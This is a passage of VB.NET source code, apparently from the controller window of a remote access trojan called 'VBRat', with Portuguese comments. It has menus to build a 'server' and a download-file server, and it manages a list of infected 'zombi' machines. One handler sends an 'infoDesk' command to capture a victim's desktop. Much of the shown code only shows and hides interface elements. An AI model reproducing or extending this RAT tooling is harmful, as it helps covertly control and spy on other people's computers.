    Private Sub ToolStripStatusLabel2_Click_1(sender As Object, e As EventArgs) Handles ToolStripStatusLabel2.Click
        Noip.Show() 'abri forme
    End Sub

    Private Sub CreatServerToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CreatServerToolStripMenuItem.Click
        Server.Show() 'abri forme
    End Sub

    Private Sub CreatServerDownloadFileToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CreatServerDownloadFileToolStripMenuItem.Click
        Creat_Server_DownloadFile.Show() 'abri forme
    End Sub

    Private Sub UpdeterDesckVBRatToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles UpdeterDesckVBRatToolStripMenuItem.Click
        Updeterdesck.Show() 'abri forme
    End Sub

    Private Sub TestarPortasToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles TestarPortasToolStripMenuItem.Click
        Port_Teste.Show()
    End Sub

    Private Sub l1_Click(sender As Object, e As EventArgs) Handles l1.Click
        For Each x As ListViewItem In Me.l1.SelectedItems
            'ContextMenuStrip1 = selected zombi = show ContextMenuStrip1
            Me.l1.ContextMenuStrip = Me.ContextMenuStrip1 'ContextMenuStrip1 = ferramentas do rat
        Next
    End Sub

    Private Sub l1_SelectedIndexChanged(sender As Object, e As EventArgs) Handles l1.SelectedIndexChanged
        Me.l1.ContextMenuStrip = Me.ContextMenuStrip3 'ContextMenuStrip3 = 'my pasts rat configs downloads 
        If opções.CheckBox8.Checked = True Then 'capture descktop brevia
            Me.PictureBox6.Visible = True
            Me.PictureBox6.Enabled = True
            For Each x As ListViewItem In Me.l1.SelectedItems
                If Me.l1.SelectedItems.Count = 1 Then
                    s.Send(x.ToolTipText, "!!") 'linpar tela
                End If
            Next
            Me.PictureBox6.Image = Nothing 'linpar tela
            For Each x As ListViewItem In Me.l1.SelectedItems
                Me.Timer3.Start()
                s.Send(x.ToolTipText, "infoDesk") 'capture
            Next
        Else
            Me.Timer3.Enabled = False
            Me.PictureBox6.Image = Nothing 'linpar tela
            Me.PictureBox6.Visible = False
            Me.PictureBox6.Enabled = False
        End If
    End Sub

    Private Sub HideToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles HideToolStripMenuItem.Click
        Me.PictureBox1.Image = Nothing 'limpar imagem
        Me.Label1.Visible = False 'hide
    End Sub

    Private Sub ShowToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ShowToolStripMenuItem.Click
        Me.PictureBox1.Image = Me.PictureBox5.Image 'restore
        Me.Label1.Visible = True 'show
    End Sub

    Private Sub ShowToolStripMenuItem2_Click(sender As Object, e As EventArgs) Handles ShowToolStripMenuItem2.Click
        Me.PictureBox1.Image = Me.PictureBox5.Image 'restore
        Me.Label1.Visible = True 'show
    End Sub

    Private Sub HideToolStripMenuItem2_Click(sender As Object, e As EventArgs) Handles HideToolStripMenuItem2.Click
        Me.PictureBox1.Image = Nothing 'restore
        Me.Label1.Visible = False 'show
    End Sub

    Private Sub ShowToolStripMenuItem4_Click(sender As Object, e As EventArgs) Handles ShowToolStripMenuItem4.Click
        'logs show
        Me.Label3.Visible = True 'Visible yes
        Me.Label4.Visible = True 'Visible yes
        Me.ListBox1.BringToFront() 'tops
        Me.Label4.BringToFront() 'tops
        Me.Label3.BringToFront() 'tops
    End Sub

    Private Sub HideToolStripMenuItem4_Click(sender As Object, e As EventArgs) Handles HideToolStripMenuItem4.Click
        'logs hide
        Me.Label3.Visible = False 'hide
        Me.Label4.Visible = False 'hide
        Me.ListBox1.SendToBack() 'back
        Me.Label3.SendToBack() 'back
        Me.Label4.SendToBack() 'back
    End Sub

    Private Sub HideToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles HideToolStripMenuItem1.Click
        'hide StatusStrip1
        Me.PictureBox1.Visible = False
        Me.PictureBox2.Visible = False
        Me.StatusStrip1.Visible = False
        Me.Button1.Visible = False
        Me.NumericUpDown1.Visible = False
        Me.Label1.Visible = False
        Me.Label2.Visible = False
    End Sub

    Private Sub ShowToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles ShowToolStripMenuItem1.Click
        'show StatusStrip1
        Me.PictureBox1.Visible = True
        Me.PictureBox2.Visible = True
        Me.StatusStrip1.Visible = True
        Me.Button1.Visible = True
        Me.NumericUpDown1.Visible = True
        Me.Label1.Visible = True
        Me.Label2.Visible = True
    End Sub
End Class
